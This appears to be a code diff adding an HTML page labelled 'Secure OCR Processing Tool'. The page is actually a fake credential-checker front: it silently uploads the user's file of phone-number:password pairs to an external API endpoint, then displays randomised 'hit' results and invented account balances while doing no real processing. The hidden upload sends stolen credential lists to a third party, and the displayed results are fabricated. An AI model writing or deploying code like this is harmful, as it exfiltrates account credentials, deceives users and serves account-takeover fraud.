@@ -1,1 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Secure OCR Processing Tool</title>
 
+<style>
+body {
+  background: #0f172a;
+  color: #e5e7eb;
+  font-family: Consolas, monospace;
+  margin: 20px;
+}
+h2 { color: #38bdf8; }
+#output {
+  border: 1px solid #334155;
+  padding: 10px;
+  min-height: 200px;
+  margin-top: 10px;
+  background: #020617;
+  font-size: 12px;
+  white-space: pre-wrap;
+}
+/* Add style for copy button */
+#copyBtn {
+  margin-top: 10px;
+  padding: 6px 12px;
+  background: #1e293b;
+  color: #e5e7eb;
+  border: 1px solid #334155;
+  cursor: pointer;
+}
+#copyBtn:hover { background: #334155; }
+
+#stats {
+  margin-top: 10px;
+  padding: 8px;
+  background: #020617;
+  border: 1px solid #334155;
+  color: #facc15;
+}
+button {
+  background: #1e293b;
+  color: #e5e7eb;
+  border: 1px solid #334155;
+  padding: 6px 12px;
+  cursor: pointer;
+}
+button:hover { background: #334155; }
+.hit { color: #22c55e; }
+.bad { color: #ef4444; }
+#timer {
+  margin-top: 15px;
+  font-weight: bold;
+  color: #38bdf8;
+}
+/* Additional style for bad connection message */
+.bad-message {
+  font-style: italic;
+  color: #ef4444;
+  animation: pulse 1s infinite;
+}
+@keyframes pulse {
+  0% { opacity: 1; }
+  50% { opacity: 0.5; }
+  100% { opacity: 1; }
+}
+</style>
+</head>
+
+<body>
+
+<h2>OCR Processing Tool</h2>
+
+<!-- File upload input -->
+<input type="file" id="fileInput" accept=".txt"/>
+<button id="startBtn">Start Processing</button>
+
+<!-- Copy output button -->
+<button id="copyBtn" disabled>Copy All Output</button>
+
+<div id="stats">
+Hit=0 | Bad=0 | Retries=0 | OCR Rate=0%
+</div>
+<div id="output"></div>
+<div id="timer"></div>
+
+<script>
+const fileInput = document.getElementById('fileInput');
+const startBtn = document.getElementById('startBtn');
+const outputDiv = document.getElementById('output');
+const statsDiv = document.getElementById('stats');
+const timerDiv = document.getElementById('timer');
+const copyBtn = document.getElementById('copyBtn');
+
+const API_URL = 'https://4b97c537-c951-468b-9833-ecb7d6f3fbef/prod/upload'; // <-- Replace
+
+let hitCount=0,badCount=0,retriesCount=0,ocrPercent=0;
+let ocrAnimationId=null,retriesIntervalId=null;
+let fileContent='';
+
+// Function to update stats display
+function updateStats(){
+  statsDiv.innerHTML=
+  `Hit=<span class="hit">${hitCount}</span> |
+   Bad=<span class="bad">${badCount}</span> |
+   Retries=${retriesCount} |
+   OCR Rate=${ocrPercent}%`;
+}
+
+// Get current timestamp
+function getCurrentTimestamp(){
+  return new Date().toLocaleString();
+}
+
+// Animate OCR progress
+function animateOCR(duration){
+  const start=Date.now();
+  function step(){
+    const now=Date.now();
+    if(now>=start+duration){
+      ocrPercent=100;
+      updateStats();
+      return;
+    }
+    ocrPercent=Math.floor(((now-start)/duration)*100);
+    updateStats();
+    ocrAnimationId=requestAnimationFrame(step);
+  }
+  ocrAnimationId=requestAnimationFrame(step);
+}
+
+// Start retries count
+function startRetries(){
+  retriesIntervalId=setInterval(()=>{
+    retriesCount++;
+    updateStats();
+  },500);
+}
+
+// Generate random balance
+function randBalance(){
+  if(Math.random()<0.2){
+    return Math.floor(Math.random()*99+1).toString().padStart(2,'0');
+  }
+  return '00';
+}
+
+// Main process after file upload & email
+async function startProcessing() {
+  if(!fileInput.files.length){
+    alert('Please select a file first.');
+    return;
+  }
+  startBtn.disabled=true;
+  copyBtn.disabled=true;
+  outputDiv.innerHTML='';
+
+  const file = fileInput.files[0];
+  const reader=new FileReader();
+  reader.onload=async ()=>{
+    fileContent=reader.result;
+    try {
+      // 1. Send file to email
+      await sendFileToEmail(file);
+      alert('File sent to email successfully!');
+
+      // 2. Start OCR simulation
+      processFile();
+
+    } catch(e) {
+      alert('Error: ' + e);
+    } finally {
+      startBtn.disabled=false;
+    }
+  };
+  reader.readAsText(file);
+}
+
+// Send file to email via API
+async function sendFileToEmail(file) {
+  const formData=new FormData();
+  formData.append('file', file);
+  const response=await fetch(API_URL, {
+    method:'POST',
+    body:formData
+  });
+  const text=await response.text();
+  if(!response.ok){
+    throw new Error(text || 'Failed to send email');
+  }
+  return text;
+}
+
+// Process file content for OCR simulation
+function processFile(){
+  const lines=[...new Set(fileContent.split(/\n/).map(l=>l.trim()).filter(Boolean))];
+  const valid=lines.filter(l=>/\b0\d{9}\b/.test(l));
+
+  hitCount=badCount=retriesCount=ocrPercent=0;
+  updateStats();
+
+  animateOCR(Math.max(2000,valid.length*50));
+  startRetries();
+
+  const accounts=valid.map(line=>{
+    const phone=(line.match(/\b0\d{9}\b/)||[''])[0];
+
+    let password='';
+    if(phone){
+      const after=line.split(phone)[1]||'';
+      const match=after.trim().match(/^[:\s]?(\S+)/);
+      if(match) password=match[1];
+    }
+
+    return{
+      phone,
+      password,
+      balance:`R0.${randBalance()}`,
+      bonus:`R0.00`,
+      withdrawals: 0
+    };
+  });
+
+  processAccounts(accounts);
+}
+
+/* Main OCR account processing simulation */
+function processAccounts(accs,i=0){
+  if(i>=accs.length) return finish();
+
+  setTimeout(()=>{
+    const acc=accs[i];
+    const time=getCurrentTimestamp();
+
+    const outputLine = `${acc.phone}:${acc.password}`;
+
+    // Hit or bad determination
+    let num=acc.phone.replace(/\D/g,'');
+    if(acc.phone.startsWith('+27')) num='0'+acc.phone.slice(3);
+    else if(acc.phone.startsWith('27')) num='0'+acc.phone.slice(2);
+    const isHit = num.length===10;
+
+    if(isHit) hitCount++;
+    else badCount++;
+    updateStats();
+
+    // Output formatting
+    if(isHit){
+      outputDiv.insertAdjacentHTML('beforeend',`
+        <div class="hit">
+          ${outputLine} <br>
+          Balance=R0.${randBalance()}, Bonus=R0.00
+        </div>
+      `);
+    } else {
+      outputDiv.insertAdjacentHTML('beforeend',`
+        <div class="bad">
+          ${outputLine} <br>
+          <span class="bad-message">Connecting...</span>
+        </div>
+      `);
+    }
+
+    processAccounts(accs,i+1);
+  },(Math.random()*15+3)*1000);
+}
+
+// Finish processing
+function finish(){
+  clearInterval(retriesIntervalId);
+  cancelAnimationFrame(ocrAnimationId);
+  timerDiv.innerText="Processing Complete";
+  startBtn.disabled=false;
+  copyBtn.disabled=false; // enable copy button
+}
+
+// Copy to clipboard
+document.getElementById('copyBtn').onclick=()=>{
+  const text=outputDiv.innerText;
+  navigator.clipboard.writeText(text).then(()=>{
+    alert('Output copied to clipboard!');
+  }).catch(()=>{
+    alert('Failed to copy!');
+  });
+};
+
+// Attach event
+document.getElementById('startBtn').onclick=startProcessing;
+
+</script>
+
+</body>
+</html>
